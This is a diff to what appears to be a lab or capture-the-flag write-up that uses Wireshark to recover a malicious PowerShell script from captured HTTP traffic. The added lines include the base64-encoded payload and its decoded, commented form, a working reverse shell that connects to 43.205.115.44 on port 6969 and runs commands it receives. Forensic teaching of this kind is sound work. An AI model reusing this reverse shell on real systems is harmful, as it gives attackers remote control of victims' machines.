@@ -55,9 +55,52 @@ Filter:
 ```text
 **ip.dst==43.205.115.44 && http.request.uri == "/office2024install.ps1"**
 ```
-After identifying the http request, we can **Right click on the packet > Follow > Follow > HTTP Stream** or alternatively you can click on the packet and use the shortcut, **Ctrl + Alt + Shift + H**
+After identifying the http request, we can **Right click on the packet > Follow > Follow > HTTP Stream** or alternatively you can click on the packet and use the shortcut, **Ctrl + Alt + Shift + H**  
+![HTTP Stream](./Images/wireshark_pikaptcha.png)
 
 The http stream will show us the http communication from the compromised host to the attacker infrastructure, revealing the contents of the remotely hosted powershell script. This technique can be used to recover any files transfered over the web over unencrypted traffic.
 
 HTTP Stream:  
-![HTTP Stream}(./Images/wireshark_pikaptcha.png)
+
+![HTTP Stream](./Images/http_stream_pikaptcha.png)
+
+In the image provided we can see the HTTP stream containing base64 encoded powershell. The -e flag is used to specify the command is encoded. To work with the data, we can use GCHQ's ![CyberChef](/https://gchq.github.io/CyberChef/). Below is the raw base64 encoded blob.
+```powershell
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+```
+
+After adding **"From base64"** and **"Remove null bytes"**, we get the malicious poweshell code. I've added a newline after each semicolon and included comments to better explain the functionality of the code.
+```powershell
+# Prepares a TCP connection to the attacker infrastructure over port 6969
+$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969);
+
+# Get the network stream from an existing TcpClient ($client must already be connected)
+$stream = $client.GetStream();
+
+# Allocate a 65,536-byte buffer (byte array) initialized to zeros for reading incoming data
+[byte[]]$bytes = 0..65535|%{0};
+
+# Loop: read from the TCP stream until Read() returns 0 (remote closed connection)
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+  # Convert the received bytes (0 .. $i-1) into an ASCII string -> the incoming command
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+
+  # Execute the received string as PowerShell code and capture stdout + stderr as a single string
+  $sendback = (iex $data 2>&1 | Out-String );
+
+  # Append a simple PowerShell-like prompt containing the present working directory
+  # This makes the connection interactive from the attacker's perspective.
+  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+
+  # Encode the response string back into ASCII bytes for sending over the TCP stream
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+
+  # Send the encoded response bytes back to the remote host
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+
+  # Flush the stream to ensure data is transmitted immediately
+  $stream.Flush()};
+
+# Close the client socket when the loop ends (connection closed)
+$client.Close()
+```
